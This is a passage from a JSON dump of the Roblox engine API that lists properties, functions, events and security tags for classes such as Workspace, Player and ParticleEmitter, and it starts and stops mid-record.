sabled","tags":[],"Class":"VehicleSeat"},{"ValueType":"bool","type":"Property","Name":"HeadsUpDisplay","tags":[],"Class":"VehicleSeat"},{"ValueType":"float","type":"Property","Name":"MaxSpeed","tags":[],"Class":"VehicleSeat"},{"ValueType":"Object","type":"Property","Name":"Occupant","tags":["readonly"],"Class":"VehicleSeat"},{"ValueType":"int","type":"Property","Name":"Steer","tags":[],"Class":"VehicleSeat"},{"ValueType":"int","type":"Property","Name":"Throttle","tags":[],"Class":"VehicleSeat"},{"ValueType":"float","type":"Property","Name":"Torque","tags":[],"Class":"VehicleSeat"},{"ValueType":"float","type":"Property","Name":"TurnSpeed","tags":[],"Class":"VehicleSeat"},{"Superclass":"PVInstance","type":"Class","Name":"Model","tags":[]},{"ValueType":"Object","type":"Property","Name":"PrimaryPart","tags":[],"Class":"Model"},{"ReturnType":"void","Arguments":[],"Name":"BreakJoints","tags":[],"Class":"Model","type":"Function"},{"ReturnType":"Vector3","Arguments":[],"Name":"GetExtentsSize","tags":[],"Class":"Model","type":"Function"},{"ReturnType":"CoordinateFrame","Arguments":[],"Name":"GetModelCFrame","tags":["deprecated"],"Class":"Model","type":"Function"},{"ReturnType":"Vector3","Arguments":[],"Name":"GetModelSize","tags":["deprecated"],"Class":"Model","type":"Function"},{"ReturnType":"CoordinateFrame","Arguments":[],"Name":"GetPrimaryPartCFrame","tags":[],"Class":"Model","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"MakeJoints","tags":[],"Class":"Model","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Vector3","Name":"position","Default":null}],"Name":"MoveTo","tags":[],"Class":"Model","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"ResetOrientationToIdentity","tags":["deprecated"],"Class":"Model","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"SetIdentityOrientation","tags":["deprecated"],"Class":"Model","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"CoordinateFrame","Name":"cframe","Default":null}],"Name":"SetPrimaryPartCFrame","tags":[],"Class":"Model","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Vector3","Name":"delta","Default":null}],"Name":"TranslateBy","tags":[],"Class":"Model","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"breakJoints","tags":["deprecated"],"Class":"Model","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"makeJoints","tags":["deprecated"],"Class":"Model","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Vector3","Name":"location","Default":null}],"Name":"move","tags":["deprecated"],"Class":"Model","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Vector3","Name":"location","Default":null}],"Name":"moveTo","tags":["deprecated"],"Class":"Model","type":"Function"},{"Superclass":"Model","type":"Class","Name":"RootInstance","tags":["notbrowsable"]},{"Superclass":"RootInstance","type":"Class","Name":"Workspace","tags":[]},{"ValueType":"bool","type":"Property","Name":"AllowThirdPartySales","tags":[],"Class":"Workspace"},{"ValueType":"Object","type":"Property","Name":"CurrentCamera","tags":[],"Class":"Workspace"},{"ValueType":"double","type":"Property","Name":"DistributedGameTime","tags":[],"Class":"Workspace"},{"ValueType":"bool","type":"Property","Name":"FilteringEnabled","tags":[],"Class":"Workspace"},{"ValueType":"float","type":"Property","Name":"Gravity","tags":[],"Class":"Workspace"},{"ValueType":"bool","type":"Property","Name":"StreamingEnabled","tags":[],"Class":"Workspace"},{"ValueType":"Object","type":"Property","Name":"Terrain","tags":["readonly"],"Class":"Workspace"},{"ReturnType":"void","Arguments":[{"Type":"Objects","Name":"objects","Default":null}],"Name":"BreakJoints","tags":["PluginSecurity"],"Class":"Workspace","type":"Function"},{"ReturnType":"bool","Arguments":[],"Name":"ExperimentalSolverIsEnabled","tags":["LocalUserSecurity"],"Class":"Workspace","type":"Function"},{"ReturnType":"Tuple","Arguments":[{"Type":"Ray","Name":"ray","Default":null},{"Type":"Instance","Name":"ignoreDescendentsInstance","Default":"nil"},{"Type":"bool","Name":"terrainCellsAreCubes","Default":"false"},{"Type":"bool","Name":"ignoreWater","Default":"false"}],"Name":"FindPartOnRay","tags":[],"Class":"Workspace","type":"Function"},{"ReturnType":"Tuple","Arguments":[{"Type":"Ray","Name":"ray","Default":null},{"Type":"Objects","Name":"ignoreDescendentsTable","Default":null},{"Type":"bool","Name":"terrainCellsAreCubes","Default":"false"},{"Type":"bool","Name":"ignoreWater","Default":"false"}],"Name":"FindPartOnRayWithIgnoreList","tags":[],"Class":"Workspace","type":"Function"},{"ReturnType":"Objects","Arguments":[{"Type":"Region3","Name":"region","Default":null},{"Type":"Instance","Name":"ignoreDescendentsInstance","Default":"nil"},{"Type":"int","Name":"maxParts","Default":"20"}],"Name":"FindPartsInRegion3","tags":[],"Class":"Workspace","type":"Function"},{"ReturnType":"Objects","Arguments":[{"Type":"Region3","Name":"region","Default":null},{"Type":"Objects","Name":"ignoreDescendentsTable","Default":null},{"Type":"int","Name":"maxParts","Default":"20"}],"Name":"FindPartsInRegion3WithIgnoreList","tags":[],"Class":"Workspace","type":"Function"},{"ReturnType":"int","Arguments":[],"Name":"GetNumAwakeParts","tags":[],"Class":"Workspace","type":"Function"},{"ReturnType":"bool","Arguments":[],"Name":"GetPhysicsAnalyzerBreakOnIssue","tags":["PluginSecurity"],"Class":"Workspace","type":"Function"},{"ReturnType":"Objects","Arguments":[{"Type":"int","Name":"index","Default":null}],"Name":"GetPhysicsAnalyzerIssue","tags":["PluginSecurity"],"Class":"Workspace","type":"Function"},{"ReturnType":"int","Arguments":[],"Name":"GetPhysicsThrottling","tags":[],"Class":"Workspace","type":"Function"},{"ReturnType":"double","Arguments":[],"Name":"GetRealPhysicsFPS","tags":[],"Class":"Workspace","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"Region3","Name":"region","Default":null},{"Type":"Instance","Name":"ignoreDescendentsInstance","Default":"nil"}],"Name":"IsRegion3Empty","tags":[],"Class":"Workspace","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"Region3","Name":"region","Default":null},{"Type":"Objects","Name":"ignoreDescendentsTable","Default":null}],"Name":"IsRegion3EmptyWithIgnoreList","tags":[],"Class":"Workspace","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Objects","Name":"objects","Default":null},{"Type":"JointCreationMode","Name":"jointType","Default":null}],"Name":"JoinToOutsiders","tags":[],"Class":"Workspace","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Objects","Name":"objects","Default":null}],"Name":"MakeJoints","tags":["PluginSecurity"],"Class":"Workspace","type":"Function"},{"ReturnType":"bool","Arguments":[],"Name":"PGSIsEnabled","tags":[],"Class":"Workspace","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"enable","Default":null}],"Name":"SetPhysicsAnalyzerBreakOnIssue","tags":["PluginSecurity"],"Class":"Workspace","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"value","Default":null}],"Name":"SetPhysicsThrottleEnabled","tags":["LocalUserSecurity"],"Class":"Workspace","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Objects","Name":"objects","Default":null}],"Name":"UnjoinFromOutsiders","tags":[],"Class":"Workspace","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"ZoomToExtents","tags":["PluginSecurity"],"Class":"Workspace","type":"Function"},{"ReturnType":"Tuple","Arguments":[{"Type":"Ray","Name":"ray","Default":null},{"Type":"Instance","Name":"ignoreDescendentsInstance","Default":"nil"},{"Type":"bool","Name":"terrainCellsAreCubes","Default":"false"},{"Type":"bool","Name":"ignoreWater","Default":"false"}],"Name":"findPartOnRay","tags":["deprecated"],"Class":"Workspace","type":"Function"},{"ReturnType":"Objects","Arguments":[{"Type":"Region3","Name":"region","Default":null},{"Type":"Instance","Name":"ignoreDescendentsInstance","Default":"nil"},{"Type":"int","Name":"maxParts","Default":"20"}],"Name":"findPartsInRegion3","tags":["deprecated"],"Class":"Workspace","type":"Function"},{"Arguments":[{"Name":"count","Type":"int"}],"Name":"PhysicsAnalyzerIssuesFound","tags":["PluginSecurity"],"Class":"Workspace","type":"Event"},{"Superclass":"Model","type":"Class","Name":"Status","tags":["deprecated","notCreatable"]},{"Superclass":"Instance","type":"Class","Name":"Pages","tags":[]},{"ValueType":"bool","type":"Property","Name":"IsFinished","tags":["readonly"],"Class":"Pages"},{"ReturnType":"Array","Arguments":[],"Name":"GetCurrentPage","tags":[],"Class":"Pages","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"AdvanceToNextPageAsync","tags":[],"Class":"Pages","type":"YieldFunction"},{"Superclass":"Pages","type":"Class","Name":"DataStorePages","tags":[]},{"Superclass":"Pages","type":"Class","Name":"FriendPages","tags":[]},{"Superclass":"Pages","type":"Class","Name":"StandardPages","tags":[]},{"Superclass":"Instance","type":"Class","Name":"PartOperationAsset","tags":[]},{"Superclass":"Instance","type":"Class","Name":"ParticleEmitter","tags":[]},{"ValueType":"Vector3","type":"Property","Name":"Acceleration","tags":[],"Class":"ParticleEmitter"},{"ValueType":"ColorSequence","type":"Property","Name":"Color","tags":[],"Class":"ParticleEmitter"},{"ValueType":"float","type":"Property","Name":"Drag","tags":[],"Class":"ParticleEmitter"},{"ValueType":"NormalId","type":"Property","Name":"EmissionDirection","tags":[],"Class":"ParticleEmitter"},{"ValueType":"bool","type":"Property","Name":"Enabled","tags":[],"Class":"ParticleEmitter"},{"ValueType":"NumberRange","type":"Property","Name":"Lifetime","tags":[],"Class":"ParticleEmitter"},{"ValueType":"float","type":"Property","Name":"LightEmission","tags":[],"Class":"ParticleEmitter"},{"ValueType":"bool","type":"Property","Name":"LockedToPart","tags":[],"Class":"ParticleEmitter"},{"ValueType":"float","type":"Property","Name":"Rate","tags":[],"Class":"ParticleEmitter"},{"ValueType":"NumberRange","type":"Property","Name":"RotSpeed","tags":[],"Class":"ParticleEmitter"},{"ValueType":"NumberRange","type":"Property","Name":"Rotation","tags":[],"Class":"ParticleEmitter"},{"ValueType":"NumberSequence","type":"Property","Name":"Size","tags":[],"Class":"ParticleEmitter"},{"ValueType":"NumberRange","type":"Property","Name":"Speed","tags":[],"Class":"ParticleEmitter"},{"ValueType":"Content","type":"Property","Name":"Texture","tags":[],"Class":"ParticleEmitter"},{"ValueType":"NumberSequence","type":"Property","Name":"Transparency","tags":[],"Class":"ParticleEmitter"},{"ValueType":"float","type":"Property","Name":"VelocityInheritance","tags":[],"Class":"ParticleEmitter"},{"ValueType":"float","type":"Property","Name":"VelocitySpread","tags":[],"Class":"ParticleEmitter"},{"ValueType":"float","type":"Property","Name":"ZOffset","tags":[],"Class":"ParticleEmitter"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"particleCount","Default":"16"}],"Name":"Emit","tags":[],"Class":"ParticleEmitter","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"Path","tags":[]},{"ValueType":"PathStatus","type":"Property","Name":"Status","tags":["readonly"],"Class":"Path"},{"ReturnType":"Array","Arguments":[],"Name":"GetPointCoordinates","tags":[],"Class":"Path","type":"Function"},{"ReturnType":"int","Arguments":[{"Type":"int","Name":"start","Default":null}],"Name":"CheckOcclusionAsync","tags":[],"Class":"Path","type":"YieldFunction"},{"Superclass":"Instance","type":"Class","Name":"PathfindingService","tags":["notCreatable"]},{"ValueType":"float","type":"Property","Name":"EmptyCutoff","tags":[],"Class":"PathfindingService"},{"ReturnType":"Instance","Arguments":[{"Type":"Vector3","Name":"start","Default":null},{"Type":"Vector3","Name":"finish","Default":null},{"Type":"float","Name":"maxDistance","Default":null}],"Name":"ComputeRawPathAsync","tags":[],"Class":"PathfindingService","type":"YieldFunction"},{"ReturnType":"Instance","Arguments":[{"Type":"Vector3","Name":"start","Default":null},{"Type":"Vector3","Name":"finish","Default":null},{"Type":"float","Name":"maxDistance","Default":null}],"Name":"ComputeSmoothPathAsync","tags":[],"Class":"PathfindingService","type":"YieldFunction"},{"Superclass":"Instance","type":"Class","Name":"PersonalServerService","tags":[]},{"ValueType":"string","type":"Property","Name":"RoleSets","tags":["RobloxScriptSecurity"],"Class":"PersonalServerService"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"player","Default":null}],"Name":"Demote","tags":["RobloxScriptSecurity"],"Class":"PersonalServerService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"player","Default":null}],"Name":"Promote","tags":["RobloxScriptSecurity"],"Class":"PersonalServerService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"personalServerGetRankUrl","Default":null}],"Name":"SetPersonalServerGetRankUrl","tags":["LocalUserSecurity"],"Class":"PersonalServerService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"personalServerRoleSetsUrl","Default":null}],"Name":"SetPersonalServerRoleSetsUrl","tags":["LocalUserSecurity"],"Class":"PersonalServerService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"personalServerSetRankUrl","Default":null}],"Name":"SetPersonalServerSetRankUrl","tags":["LocalUserSecurity"],"Class":"PersonalServerService","type":"Function"},{"ReturnType":"string","Arguments":[{"Type":"int","Name":"placeId","Default":null}],"Name":"GetRoleSets","tags":["RobloxScriptSecurity"],"Class":"PersonalServerService","type":"YieldFunction"},{"Superclass":"Instance","type":"Class","Name":"PhysicsPacketCache","tags":[]},{"Superclass":"Instance","type":"Class","Name":"PhysicsService","tags":[]},{"Superclass":"Instance","type":"Class","Name":"PhysicsSettings","tags":[]},{"ValueType":"bool","type":"Property","Name":"AllowSleep","tags":[],"Class":"PhysicsSettings"},{"ValueType":"bool","type":"Property","Name":"AreAnchorsShown","tags":[],"Class":"PhysicsSettings"},{"ValueType":"bool","type":"Property","Name":"AreAssembliesShown","tags":[],"Class":"PhysicsSettings"},{"ValueType":"bool","type":"Property","Name":"AreAttachmentsShown","tags":[],"Class":"PhysicsSettings"},{"ValueType":"bool","type":"Property","Name":"AreAwakePartsHighlighted","tags":[],"Class":"PhysicsSettings"},{"ValueType":"bool","type":"Property","Name":"AreBodyTypesShown","tags":[],"Class":"PhysicsSettings"},{"ValueType":"bool","type":"Property","Name":"AreConstraintsShown","tags":[],"Class":"PhysicsSettings"},{"ValueType":"bool","type":"Property","Name":"AreContactPointsShown","tags":[],"Class":"PhysicsSettings"},{"ValueType":"bool","type":"Property","Name":"AreJointCoordinatesShown","tags":[],"Class":"PhysicsSettings"},{"ValueType":"bool","type":"Property","Name":"AreMechanismsShown","tags":[],"Class":"PhysicsSettings"},{"ValueType":"bool","type":"Property","Name":"AreModelCoordsShown","tags":[],"Class":"PhysicsSettings"},{"ValueType":"bool","type":"Property","Name":"AreOwnersShown","tags":[],"Class":"PhysicsSettings"},{"ValueType":"bool","type":"Property","Name":"ArePartCoordsShown","tags":[],"Class":"PhysicsSettings"},{"ValueType":"bool","type":"Property","Name":"AreRegionsShown","tags":[],"Class":"PhysicsSettings"},{"ValueType":"bool","type":"Property","Name":"AreUnalignedPartsShown","tags":[],"Class":"PhysicsSettings"},{"ValueType":"bool","type":"Property","Name":"AreWorldCoordsShown","tags":[],"Class":"PhysicsSettings"},{"ValueType":"bool","type":"Property","Name":"IsReceiveAgeShown","tags":[],"Class":"PhysicsSettings"},{"ValueType":"bool","type":"Property","Name":"IsTreeShown","tags":[],"Class":"PhysicsSettings"},{"ValueType":"bool","type":"Property","Name":"ParallelPhysics","tags":[],"Class":"PhysicsSettings"},{"ValueType":"bool","type":"Property","Name":"PhysicsAnalyzerEnabled","tags":["PluginSecurity","readonly"],"Class":"PhysicsSettings"},{"ValueType":"EnviromentalPhysicsThrottle","type":"Property","Name":"PhysicsEnvironmentalThrottle","tags":[],"Class":"PhysicsSettings"},{"ValueType":"bool","type":"Property","Name":"ShowDecompositionGeometry","tags":[],"Class":"PhysicsSettings"},{"ValueType":"double","type":"Property","Name":"ThrottleAdjustTime","tags":[],"Class":"PhysicsSettings"},{"Superclass":"Instance","type":"Class","Name":"Player","tags":[]},{"ValueType":"int","type":"Property","Name":"AccountAge","tags":["readonly"],"Class":"Player"},{"ValueType":"bool","type":"Property","Name":"AppearanceDidLoad","tags":["RobloxScriptSecurity","deprecated","readonly"],"Class":"Player"},{"ValueType":"bool","type":"Property","Name":"AutoJumpEnabled","tags":[],"Class":"Player"},{"ValueType":"float","type":"Property","Name":"CameraMaxZoomDistance","tags":[],"Class":"Player"},{"ValueType":"float","type":"Property","Name":"CameraMinZoomDistance","tags":[],"Class":"Player"},{"ValueType":"CameraMode","type":"Property","Name":"CameraMode","tags":[],"Class":"Player"},{"ValueType":"bool","type":"Property","Name":"CanLoadCharacterAppearance","tags":[],"Class":"Player"},{"ValueType":"Object","type":"Property","Name":"Character","tags":[],"Class":"Player"},{"ValueType":"string","type":"Property","Name":"CharacterAppearance","tags":["notbrowsable"],"Class":"Player"},{"ValueType":"ChatMode","type":"Property","Name":"ChatMode","tags":["RobloxScriptSecurity","readonly"],"Class":"Player"},{"ValueType":"int","type":"Property","Name":"DataComplexity","tags":["readonly"],"Class":"Player"},{"ValueType":"int","type":"Property","Name":"DataComplexityLimit","tags":["LocalUserSecurity"],"Class":"Player"},{"ValueType":"bool","type":"Property","Name":"DataReady","tags":["readonly"],"Class":"Player"},{"ValueType":"DevCameraOcclusionMode","type":"Property","Name":"DevCameraOcclusionMode","tags":[],"Class":"Player"},{"ValueType":"DevComputerCameraMovementMode","type":"Property","Name":"DevComputerCameraMode","tags":[],"Class":"Player"},{"ValueType":"DevComputerMovementMode","type":"Property","Name":"DevComputerMovementMode","tags":[],"Class":"Player"},{"ValueType":"bool","type":"Property","Name":"DevEnableMouseLock","tags":[],"Class":"Player"},{"ValueType":"DevTouchCameraMovementMode","type":"Property","Name":"DevTouchCameraMode","tags":[],"Class":"Player"},{"ValueType":"DevTouchMovementMode","type":"Property","Name":"DevTouchMovementMode","tags":[],"Class":"Player"},{"ValueType":"int","type":"Property","Name":"FollowUserId","tags":["readonly"],"Class":"Player"},{"ValueType":"bool","type":"Property","Name":"Guest","tags":["RobloxScriptSecurity","readonly"],"Class":"Player"},{"ValueType":"bool","type":"Property","Name":"HasBuildTools","tags":["RobloxScriptSecurity"],"Class":"Player"},{"ValueType":"float","type":"Property","Name":"HealthDisplayDistance","tags":[],"Class":"Player"},{"ValueType":"float","type":"Property","Name":"MaximumSimulationRadius","tags":["LocalUserSecurity"],"Class":"Player"},{"ValueType":"MembershipType","type":"Property","Name":"MembershipType","tags":["readonly"],"Class":"Player"},{"ValueType":"float","type":"Property","Name":"NameDisplayDistance","tags":[],"Class":"Player"},{"ValueType":"bool","type":"Property","Name":"Neutral","tags":[],"Class":"Player"},{"ValueType":"int","type":"Property","Name":"PersonalServerRank","tags":["RobloxScriptSecurity"],"Class":"Player"},{"ValueType":"Object","type":"Property","Name":"RespawnLocation","tags":[],"Class":"Player"},{"ValueType":"float","type":"Property","Name":"SimulationRadius","tags":["LocalUserSecurity"],"Class":"Player"},{"ValueType":"BrickColor","type":"Property","Name":"TeamColor","tags":[],"Class":"Player"},{"ValueType":"bool","type":"Property","Name":"Teleported","tags":["RobloxScriptSecurity","hidden","readonly"],"Class":"Player"},{"ValueType":"bool","type":"Property","Name":"TeleportedIn","tags":["RobloxScriptSecurity"],"Class":"Player"},{"ValueType":"int","type":"Property","Name":"UserId","tags":[],"Class":"Player"},{"ValueType":"string","type":"Property","Name":"VRDevice","tags":["RobloxScriptSecurity"],"Class":"Player"},{"ValueType":"int","type":"Property","Name":"userId","tags":["deprecated"],"Class":"Player"},{"ReturnType":"void","Arguments":[],"Name":"ClearCharacterAppearance","tags":[],"Class":"Player","type":"Function"},{"ReturnType":"float","Arguments":[{"Type":"Vector3","Name":"point","Default":null}],"Name":"DistanceFromCharacter","tags":[],"Class":"Player","type":"Function"},{"ReturnType":"FriendStatus","Arguments":[{"Type":"Instance","Name":"player","Default":null}],"Name":"GetFriendStatus","tags":["RobloxScriptSecurity"],"Class":"Player","type":"Function"},{"ReturnType":"string","Arguments":[],"Name":"GetGameSessionID","tags":["RobloxSecurity"],"Class":"Player","type":"Function"},{"ReturnType":"Instance","Arguments":[],"Name":"GetMouse","tags":[],"Class":"Player","type":"Function"},{"ReturnType":"bool","Arguments":[],"Name":"GetUnder13","tags":["RobloxScriptSecurity"],"Class":"Player","type":"Function"},{"ReturnType":"bool","Arguments":[],"Name":"HasAppearanceLoaded","tags":[],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"JumpCharacter","tags":["RobloxScriptSecurity"],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"message","Default":""}],"Name":"Kick","tags":[],"Class":"Player","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"string","Name":"key","Default":null}],"Name":"LoadBoolean","tags":[],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"inGame","Default":"true"}],"Name":"LoadCharacter","tags":[],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"assetInstance","Default":null}],"Name":"LoadCharacterAppearance","tags":[],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"LoadData","tags":["LocalUserSecurity"],"Class":"Player","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"string","Name":"key","Default":null}],"Name":"LoadInstance","tags":[],"Class":"Player","type":"Function"},{"ReturnType":"double","Arguments":[{"Type":"string","Name":"key","Default":null}],"Name":"LoadNumber","tags":[],"Class":"Player","type":"Function"},{"ReturnType":"string","Arguments":[{"Type":"string","Name":"key","Default":null}],"Name":"LoadString","tags":[],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Vector3","Name":"walkDirection","Default":null},{"Type":"bool","Name":"relativeToCamera","Default":"false"}],"Name":"Move","tags":[],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Vector2","Name":"walkDirection","Default":null},{"Type":"float","Name":"maxWalkDelta","Default":null}],"Name":"MoveCharacter","tags":["RobloxScriptSecurity"],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"RemoveCharacter","tags":["LocalUserSecurity"],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"player","Default":null}],"Name":"RequestFriendship","tags":["RobloxScriptSecurity"],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"player","Default":null}],"Name":"RevokeFriendship","tags":["RobloxScriptSecurity"],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"key","Default":null},{"Type":"bool","Name":"value","Default":null}],"Name":"SaveBoolean","tags":[],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"SaveData","tags":["LocalUserSecurity"],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"key","Default":null},{"Type":"Instance","Name":"value","Default":null}],"Name":"SaveInstance","tags":[],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"SaveLeaderboardData","tags":["LocalUserSecurity"],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"key","Default":null},{"Type":"double","Name":"value","Default":null}],"Name":"SaveNumber","tags":[],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"key","Default":null},{"Type":"string","Name":"value","Default":null}],"Name":"SaveString","tags":[],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"accountAge","Default":null}],"Name":"SetAccountAge","tags":["PluginSecurity"],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"MembershipType","Name":"membershipType","Default":null}],"Name":"SetMembershipType","tags":["RobloxScriptSecurity"],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"value","Default":null}],"Name":"SetSuperSafeChat","tags":["PluginSecurity"],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"value","Default":null}],"Name":"SetUnder13","tags":["RobloxSecurity","deprecated"],"Class":"Player","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"string","Name":"key","Default":null}],"Name":"loadBoolean","tags":["deprecated"],"Class":"Player","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"string","Name":"key","Default":null}],"Name":"loadInstance","tags":["deprecated"],"Class":"Player","type":"Function"},{"ReturnType":"double","Arguments":[{"Type":"string","Name":"key","Default":null}],"Name":"loadNumber","tags":["deprecated"],"Class":"Player","type":"Function"},{"ReturnType":"string","Arguments":[{"Type":"string","Name":"key","Default":null}],"Name":"loadString","tags":["deprecated"],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"key","Default":null},{"Type":"bool","Name":"value","Default":null}],"Name":"saveBoolean","tags":["deprecated"],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"key","Default":null},{"Type":"Instance","Name":"value","Default":null}],"Name":"saveInstance","tags":["deprecated"],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"key","Default":null},{"Type":"double","Name":"value","Default":null}],"Name":"saveNumber","tags":["deprecated"],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"key","Default":null},{"Type":"string","Name":"value","Default":null}],"Name":"saveString","tags":["deprecated"],"Class":"Player","type":"Function"},{"ReturnType":"Array","Arguments":[{"Type":"int","Name":"maxFriends","Default":"200"}],"Name":"GetFriendsOnline","tags":[],"Class":"Player","type":"YieldFunction"},{"ReturnType":"int","Arguments":[{"Type":"int","Name":"groupId","Default":null}],"Name":"GetRankInGroup","tags":[],"Class":"Player","type":"YieldFunction"},{"ReturnType":"string","Arguments":[{"Type":"int","Name":"groupId","Default":null}],"Name":"GetRoleInGroup","tags":[],"Class":"Player","type":"YieldFunction"},{"ReturnType":"string","Arguments":[],"Name":"GetWebPersonalServerRank","tags":["LocalUserSecurity","backend"],"Class":"Player","type":"YieldFunction"},{"ReturnType":"bool","Arguments":[{"Type":"int","Name":"userId","Default":null}],"Name":"IsBestFriendsWith","tags":["deprecated"],"Class":"Player","type":"YieldFunction"},{"ReturnType":"bool","Arguments":[{"Type":"int","Name":"userId","Default":null}],"Name":"IsFriendsWith","tags":[],"Class":"Player","type":"YieldFunction"},{"ReturnType":"bool","Arguments":[{"Type":"int","Name":"groupId","Default":null}],"Name":"IsInGroup","tags":[],"Class":"Player","type":"YieldFunction"},{"ReturnType":"bool","Arguments":[{"Type":"int","Name":"rank","Default":null}],"Name":"SetWebPersonalServerRank","tags":["WritePlayerSecurity"],"Class":"Player","type":"YieldFunction"},{"ReturnType":"bool","Arguments":[],"Name":"WaitForDataReady","tags":[],"Class":"Player","type":"YieldFunction"},{"ReturnType":"bool","Arguments":[{"Type":"int","Name":"userId","Default":null}],"Name":"isFriendsWith","tags":["deprecated"],"Class":"Player","type":"YieldFunction"},{"ReturnType":"bool","Arguments":[],"Name":"waitForDataReady","tags":["deprecated"],"Class":"Player","type":"YieldFunction"},{"Arguments":[{"Name":"character","Type":"Instance"}],"Name":"CharacterAdded","tags":[],"Class":"Player","type":"Event"},{"Arguments":[{"Name":"character","Type":"Instance"}],"Name":"CharacterAppearanceLoaded","tags":[],"Class":"Player","type":"Event"},{"Arguments":[{"Name":"character","Type":"Instance"}],"Name":"CharacterRemoving","tags":[],"Class":"Player","type":"Event"},{"Arguments":[{"Name":"message","Type":"string"},{"Name":"recipient","Type":"Instance"}],"Name":"Chatted","tags":[],"Class":"Player","type":"Event"},{"Arguments":[{"Name":"player","Type":"Instance"},{"Name":"friendStatus","Type":"FriendStatus"}],"Name":"FriendStatusChanged","tags":["RobloxScriptSecurity"],"Class":"Player","type":"Event"},{"Arguments":[{"Name":"time","Type":"double"}],"Name":"Idled","tags":[],"Class":"Player","type":"Event"},{"Arguments":[{"Name":"teleportState","Type":"TeleportState"},{"Name":"placeId","Type":"int"},{"Name":"spawnName","Type":"string"}],"Name":"OnTeleport","tags":[],"Class":"Player","type":"Event"},{"Arguments":[{"Name":"radius","Type":"float"}],"Name":"SimulationRadiusChanged","tags":["LocalUserSecurity"],"Class":"Player","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"PlayerScripts","tags":["notCreatable"]},{"Superclass":"Instance","type":"Class","Name":"Players","tags":[]},{"ValueType":"bool","type":"Property","Name":"BubbleChat","tags":["readonly"],"Class":"Players"},{"ValueType":"bool","type":"Property","Name":"CharacterAutoLoads","tags":[],"Class":"Players"},{"ValueType":"bool","type":"Property","Name":"ClassicChat","tags":["readonly"],"Class":"Players"},{"ValueType":"Object","type":"Property","Name":"LocalPlayer","tags":["readonly"],"Class":"Players"},{"ValueType":"int","type":"Property","Name":"MaxPlayers","tags":["readonly"],"Class":"Players"},{"ValueType":"int","type":"Property","Name":"MaxPlayersInternal","tags":["LocalUserSecurity"],"Class":"Players"},{"ValueType":"int","type":"Property","Name":"NumPlayers","tags":["readonly"],"Class":"Players"},{"ValueType":"int","type":"Property","Name":"PreferredPlayers","tags":["readonly"],"Class":"Players"},{"ValueType":"int","type":"Property","Name":"PreferredPlayersInternal","tags":["LocalUserSecurity"],"Class":"Players"},{"ValueType":"Object","type":"Property","Name":"localPlayer","tags":["deprecated","hidden","readonly"],"Class":"Players"},{"ValueType":"int","type":"Property","Name":"numPlayers","tags":["deprecated","hidden","readonly"],"Class":"Players"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"key","Default":null}],"Name":"AddLeaderboardKey","tags":["LocalUserSecurity"],"Class":"Players","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"message","Default":null}],"Name":"Chat","tags":["PluginSecurity"],"Class":"Players","type":"Function"},{"R